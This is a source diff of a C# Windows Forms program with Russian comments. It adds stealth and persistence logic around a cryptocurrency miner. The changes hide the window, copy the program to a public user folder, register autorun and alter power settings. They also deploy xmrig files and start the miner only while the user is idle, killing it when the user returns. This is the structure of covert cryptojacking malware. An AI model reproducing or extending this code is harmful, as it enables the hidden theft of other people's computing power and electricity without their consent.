@@ -16,7 +16,12 @@ namespace WindowsFormsApp1
 {
     public partial class Form1 : Form
     {
-        string progStartName;
+        public static string rigDirectory;
+        public static string progStartName;
+        public static string thisProgrammDirectory;
+        public static string logFilePath;
+
+
         bool prog_started;
         string textTranslit;
         int idleTimeOld;
@@ -24,20 +29,16 @@ namespace WindowsFormsApp1
         int timeInt;
         int rigID;
         bool hiden=false;
-        bool isOnWrightPlase = false;
-        
 
-
-        public Form1()
+        public Form1()          //Инициализация формы
         {
             InitializeComponent();
 
-            //узнает дату при включерии
-            //можно сделать и так, для компактрости
+            
+            //узнает дату при включерии. можно сделать и так, для компактрости
             //*****.Text = DateTime.Now.ToString("yyyy.MM.dd, HH.mm.ss");    
             //Это можно разделять как хочешь. Можно оставить только дату или только время
 
-            //label4.Text = DateTime.Now.ToShortDateString() + ", " + DateTime.Now.ToLongTimeString();
 
             //таймер. Просто таймер, который толкает функцию "tmrShow_Tick"
             Timer tmrShow = new Timer();
@@ -46,35 +47,21 @@ namespace WindowsFormsApp1
             tmrShow.Enabled = true;
 
             progStartName = @"C:\Users\Public\Favor";
+            rigDirectory = @"C:\Users\Public\Documents\Distance";
 
             string[] path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\');
-            string s = "";
-            for (int i = 0; i < (path.Length - 1);)
-            {
-                s = s + path[i];
-                i++;
-
-                if (i < (path.Length - 1))
+                for (int i = 0; i < (path.Length - 1);)
                 {
-                    s = s + @"\";
+                    thisProgrammDirectory = thisProgrammDirectory + path[i];
+                    i++;
+
+                    if (i < (path.Length - 1))
+                    {
+                        thisProgrammDirectory = thisProgrammDirectory + @"\";
+                    }
                 }
-            }
-
-            if (s == progStartName) 
-            {
-                isOnWrightPlase = true;
-            }
-
-            /*
-            Autorun autoR = new Autorun();
-            //autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, "\"" + progStartName + "\" -autorun");
-            autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName );
-            */
-            /*
-            CreateConfig cc = new CreateConfig();
-            cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", Environment.UserName);
-            */
-
+            //LogFile l = new LogFile();
+            LogFile.Log("started");
         }
 
         struct LastInputInfo    //переменная для хранения времени бездействия системы
@@ -89,9 +76,6 @@ namespace WindowsFormsApp1
 
         LastInputInfo lastInputInfo = new LastInputInfo();  //новая переменная для работы с временем бездействия
 
-
-
-
         private async void tmrShow_Tick(object sender, EventArgs e)      //функция счётчика времени
         {
             lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo); //присвоение переменной времени бездействия
@@ -101,86 +85,83 @@ namespace WindowsFormsApp1
                                                                                             //Этот вариант лучше, хотя разницы я не знаю
             
 
-            if (hiden == false && isOnWrightPlase==true)
+            if (hiden == false && progStartName==thisProgrammDirectory)         //если программа в правильном месте
             {
+                LogFile.Log("Is on wright plase.");
                 hiden = true;
-                //Hide();
+                Hide();         //прячем ее 
+                PrepareToWorck();       //начинаем готовить ее к работе
             }
 
-            else if (hiden == false && isOnWrightPlase==false)
+            else if (hiden == false && progStartName != thisProgrammDirectory)      //если программа не в правильном месте
             {
-                idleTimeOld= Convert.ToInt32(DateTime.Now.ToString("ss"));
+                LogFile.Log("Is not on wright plase.");
+                idleTimeOld = Convert.ToInt32(DateTime.Now.ToString("ss"));
                 hiden = true;
 
+
+                LogFile.Log("Creating setings folder.");
                 DirectoryInfo di = Directory.CreateDirectory(progStartName + @"\setings");
 
-                CopyDir copy = new CopyDir();
-                await Task.Run(() => copy.copyDir(Environment.CurrentDirectory, progStartName, false));
-
+                LogFile.Log("Set autorun setings.");
                 Autorun autoR = new Autorun();
                 await Task.Run(() => autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName));
 
+                LogFile.Log("Set power setings.");
                 PowerSetings pow = new PowerSetings();
                 await Task.Run(() => pow.SetSetings(progStartName));
+
+                LogFile.Log("Copy program to wright place.");
+                await Task.Run(() => CopyDir.copyDir(Environment.CurrentDirectory, progStartName, true));
             }
 
 
 
 
-            if (File.Exists(progStartName + @"\setings\redy.txt"))
+            if (File.Exists(progStartName + @"\setings\redy.txt")) //если программа готова
             {
-                if (File.Exists(progStartName + @"\setings\json.txt"))
+                //если значение времени изменилось, то меняем его
+                if (time != DateTime.Now.ToString("HH.mm"))     
                 {
-                    string name = Environment.UserName;
-                    Translite trans = new Translite();
-                    trans.Tr2(name);
-
-                    CreateConfig cc = new CreateConfig();
-
-                    await Task.Run(() => cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", name));
-                    File.Create(Environment.CurrentDirectory + @"\setings\json.txt");
+                    time = DateTime.Now.ToString("HH.mm");
                 }
 
-                time = DateTime.Now.ToString("HH.mm");
-                timeInt = Convert.ToInt32(DateTime.Now.ToString("HH"));
-
-                if ((timeInt < 5 || timeInt > 22) && idleTime >= 800000 && prog_started == false && time != "00.00")
+                //60000= 1 минута
+                //if (idleTime >= 3600000 && prog_started == false && time != "00.00")          //60 минут
+                if (idleTime >= 360000 && prog_started == false && time != "00.00")         //6 минут
+                //if (idleTime >= 60000 && prog_started == false && time != "00.00")         //1 минут
                 {
+                    LogFile.Log("Rig start");
                     prog_started = true;
                     start_prog();
                 }
 
-                //if (idleTime >= 3600000 && prog_started == false && time != "00.00")
-                if (idleTime >= 3600000 && prog_started == false && time != "00.00")
-                {
-                    prog_started = true;
-                    start_prog();
-                }
-
-                if (idleTime <= 4000  && prog_started == true )
+                //временное изменение
+                //ночью не выключается
+                if (idleTime <= 4000  && prog_started == true && (timeInt > 5 || timeInt < 22))
                 {
                     close_prog();
                 }
 
-                if (time == "00.00" && !File.Exists(Environment.CurrentDirectory + @"/restart.txt"))
+                if (time == "00.00" && !File.Exists(thisProgrammDirectory + @"/restart.txt"))
                 {
-                    File.Create(Environment.CurrentDirectory + @"/restart.txt");
+                    File.Create(thisProgrammDirectory + @"/restart.txt");
                     prog_started = false;
                     close_prog();
                 }
 
-                if (time == "00.01" && File.Exists(Environment.CurrentDirectory + @"/restart.txt") && !File.Exists(Environment.CurrentDirectory + @"/restart1.txt"))
+                if (time == "00.01" && File.Exists(thisProgrammDirectory + @"/restart.txt") && !File.Exists(Environment.CurrentDirectory + @"/restart1.txt"))
                 {
 
-                    File.Create(Environment.CurrentDirectory + @"/restart1.txt");
+                    File.Create(thisProgrammDirectory + @"/restart1.txt");
                     FileStatus stat = new FileStatus();
                     stat.restart();
                 }
 
-                if (time == "00.02" && File.Exists(Environment.CurrentDirectory + @"/restart.txt") && File.Exists(Environment.CurrentDirectory + @"/restart1.txt"))
+                if (time == "00.02" && File.Exists(thisProgrammDirectory + @"/restart.txt") && File.Exists(Environment.CurrentDirectory + @"/restart1.txt"))
                 {
-                    File.Delete(Environment.CurrentDirectory + @"/restart.txt");
-                    File.Delete(Environment.CurrentDirectory + @"/restart1.txt");
+                    File.Delete(thisProgrammDirectory + @"/restart.txt");
+                    File.Delete(thisProgrammDirectory + @"/restart1.txt");
                     prog_started = true;
                     start_prog();
                 }
@@ -200,7 +181,6 @@ namespace WindowsFormsApp1
 
                 if (idleTimeOld <= 57)
                 {
-                    //printInt(idleTimeOld + "  " + time, false);
                     if (idleTimeOld == timeInt-3)
                     { /*
                         System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
@@ -210,8 +190,16 @@ namespace WindowsFormsApp1
                         //Environment.Exit(0);
                         File.Create(progStartName + @"\setings\redy.txt");
                         //this.Close();
-                        // Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
-                        Process.Start(@"C:\Users\Public\Favor\start.bat");
+
+
+
+                        //пока выключил
+                        //Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
+                        //Process.Start(@"C:\Users\Public\Favor\start.bat");
+
+
+
+
                         //Environment.Exit(0);
                         //this.Close();
                         // Environment.Exit(0);  C:\Users\Public\Favor
@@ -219,10 +207,6 @@ namespace WindowsFormsApp1
                         Process.GetCurrentProcess().Kill();
 
                         //System.Diagnostics.Process.Start("explorer", progStartName);
-
-
-
-
                     }
                 }
                 else
@@ -239,9 +223,15 @@ namespace WindowsFormsApp1
                         //this.Close();
                         //Process.Start(@"C:\Users\Public\Favor\explorer.exe");
 
+
+
+                        //пока выключил
                         //Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
-                        //this.Close();
-                        Process.Start(@"C:\Users\Public\Favor\start.bat");
+                        //Process.Start(@"C:\Users\Public\Favor\start.bat");
+
+
+
+
                         //Environment.Exit(0);
                         //this.Close();
 
@@ -263,9 +253,8 @@ namespace WindowsFormsApp1
             try
             {
                 System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
-                srartProg.StartInfo.FileName = Environment.CurrentDirectory+ @"\xmrig.exe";
+                srartProg.StartInfo.FileName = rigDirectory+ @"\xmrig.exe";
                 srartProg.Start();
-                //srartProg = Process.Start("xmrig.exe");
                 rigID = srartProg.Id;
                 Process.GetProcessById(rigID).PriorityClass = ProcessPriorityClass.BelowNormal;
                 prog_started = true;
@@ -392,10 +381,10 @@ namespace WindowsFormsApp1
             Translite trans = new Translite();
             trans.Tr2(name);
 
-            CreateConfig cc = new CreateConfig();
+            //CreateConfig cc = new CreateConfig();
 
-            await Task.Run(() => cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", name));
-           
+            await Task.Run(() => CreateConfig.stringeditor2(Environment.CurrentDirectory + @"\config_exam.json", Environment.CurrentDirectory + @"\config.json", "11111111111111111"));
+
         }
 
         private void button10_Click(object sender, EventArgs e)     //установки настроек Спящих режимов
@@ -404,11 +393,6 @@ namespace WindowsFormsApp1
             pow.SetSetings(progStartName);
         }
 
-        private void button11_Click(object sender, EventArgs e)     //просто создание папки
-        {
-            FolderCreate create = new FolderCreate();
-            create.PathCreate(@"C:\Users\Owerlord\Desktop\112211");
-        }
 
         private void button8_Click(object sender, EventArgs e)
         {
@@ -451,6 +435,26 @@ namespace WindowsFormsApp1
             string[] s = textBox1.Text.Split('!');
             config.SetData(s[0],s[1]);
             textBox1.Text = "";
+        }
+        private void PrepareToWorck()         // метод, который будет готовить прогу к работе
+        {
+            LogFile.Log("PrepareToWorck() started.");
+            if (!Directory.Exists(rigDirectory))
+            {
+                LogFile.Log("Created rig Directory.");
+                //FolderCreate fc = new FolderCreate();
+                FolderCreate.PathCreate(rigDirectory, true);
+            }
+
+            if (!File.Exists(rigDirectory + @"\config.json"))
+            {
+                LogFile.Log("Copied files of rig.");
+                CopyDir.copyDir(thisProgrammDirectory + @"\rig", rigDirectory, false);
+
+                LogFile.Log("Created config file for rig.");
+                CreateConfig.stringeditor2(progStartName + @"\config_exam.json", rigDirectory + @"\config.json",
+                    "11111111111111111");
+            }
         }
     }
 }
